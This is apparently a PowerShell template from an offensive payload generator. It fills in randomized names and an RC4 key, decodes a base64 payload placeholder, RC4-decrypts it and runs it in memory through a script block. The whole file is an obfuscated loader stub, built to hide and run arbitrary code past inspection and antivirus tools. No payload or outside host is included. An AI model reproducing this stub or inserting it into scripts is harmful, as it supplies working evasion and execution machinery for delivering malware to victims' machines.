function %{func_rc4_decrypt} {
    param([Byte[]]$%{var_rc4buffer})

    $%{var_key} = ([system.Text.Encoding]::UTF8).GetBytes("%{random_key}")

    $s = New-Object Byte[] 256;
    $k = New-Object Byte[] 256;

    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $%{var_key}[$i %% $%{var_key}.Length];
    }

    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) %% 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }

    $i = $j = 0;
    for ($x = 0; $x -lt $%{var_rc4buffer}.Length; $x++)
    {
        $i = ($i + 1) %% 256;
        $j = ($j + $s[$i]) %% 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) %% 256;
        $%{var_rc4buffer}[$x] = $%{var_rc4buffer}[$x] -bxor $s[$t];
    }

    $%{var_rc4buffer}
}

&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((%{func_rc4_decrypt} ([System.Convert]::FromBase64String("%{b64payload}"))))))

